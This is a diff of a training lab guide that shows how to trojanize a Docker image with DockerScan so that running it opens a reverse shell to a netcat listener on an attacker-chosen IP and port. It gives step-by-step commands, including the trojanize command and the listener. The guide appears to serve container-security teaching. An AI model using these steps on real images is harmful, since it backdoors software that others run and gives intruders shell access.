@@ -1,70 +1,101 @@
-# **`Trojanize Docker - DockerScan`**
+# **Trojanized Docker Images - DockerScan**
 
-###### A docker image can be trojanized by a tool called `DockerScan`. When a trojanized container is launched, the attacker can get a `reverse-shell` on-to the container 
+### *A docker image can be trojanized with a tool called `DockerScan`. When a trojanized container is launched, the attacker can get a `reverse-shell` on-to the container*
 
-##### Step 1:
+-------
+
+#### Step 1:
+
+* Navigate to the `Trojanized Docker Images` directory
+
+```commandline
+cd /root/container-training/Container/Trojanized-Docker-Image/
+```
 
 * Install `dockerscan`
 
-```bash
+```commandline
 export LC_CTYPE=en_US.UTF-8 && pip3 install dockerscan
 ```
 
-* Pull and save ubuntu image (`ubuntu:latest`) that is to be trojanized.
+* Pull and save the docker image that is to be trojanized
 
 ```commandline
-docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-latest
-``` 
+docker pull abhaybhargav/vul_flask && docker save abhaybhargav/vul_flask:latest -o abhaybhargav-vul_flask
+```
 
-![](img/trojan-docker-1.png)
+-------
 
-##### Step 2:
-
-* Fetch VM IP by running `ifconfig`
-
-![](img/trojan-docker-2.png)
-
-
-##### Step 3:
+#### Step 2:
 
 * Set the necessary environment variables for `dockerscan` to run
 
-```bash
+```commandline
 export LC_ALL=C.UTF-8
 
 export LANG=C.UTF-8
 ```
 
-* Trojanize the saved docker file by running `dockerscan image modify trojanize ubuntu-latest -l <REMOTE_MACHINE_IP> -p <PORT> -o ubuntu-latest-trojanized`. It will create a `.tar` file.
+* Fetch the IP of the provisioned server
 
-![](img/trojan-docker-3.png)
+```commandline
+serverip
+```
 
+* Trojanize the saved docker to create a `.tar` file
 
-##### Step 4:
+```commandline
+dockerscan image modify trojanize abhaybhargav-vul_flask -l <IP> -p <PORT> -o abhaybhargav-vul_flask-trojanized
+```
 
-* Once the command on Step 3 has been run, a `netcat` command is returned. Copy and paste the command in another tab.
+**EXAMPLE**: `dockerscan image modify trojanize abhaybhargav-vul_flask -l 104.1.1.1 -p 1337 -o abhaybhargav-vul_flask-trojanized`
 
-![](img/trojan-docker-4.png)
+-------
 
+#### Step 3:
 
-##### Step 5:
+* Once the command on **Step 2** has been run, a `netcat` command is returned. Run the command in another tab or use `tmux` to split the terminal.
 
-* Load the trojanized docker `.tar` file by running `docker load -i ubuntu-latest-trojanized.tar`
+```commandline
+nc -v -k -l <IP> <PORT>
+```
 
-![](img/trojan-docker-5.png)
+**EXAMPLE**: `nc -v -k -l 104.1.1.1 1337`
 
+* Load the trojanized `.tar` docker file
 
-##### Step 6:
+```commandline
+docker load -i abhaybhargav-vul_flask-trojanized.tar
+```
+
+-------
+
+#### Step 4:
+
+* Confirm that the trojanized image has been loaded
+
+```commandline
+docker images
+```
 
 * When the trojanized docker is run, the listener should have reverse-shell access to the container
 
-![](img/trojan-docker-6.png)
+```commandline
+docker run -d -p 5000:5000 abhaybhargav/vul_flask
+```
 
+-------
 
-##### Stop all running docker containers
+#### Step 5:
 
-* Run `clean-docker` to stop all the containers
+* Stop/Close the `reverse-shell` tab
+
+* Stop all containers
 
 ```commandline
-root@we45:~$ clean-docker
+clean-docker
 ```
+
+---------
+
+### Reading Material/References:
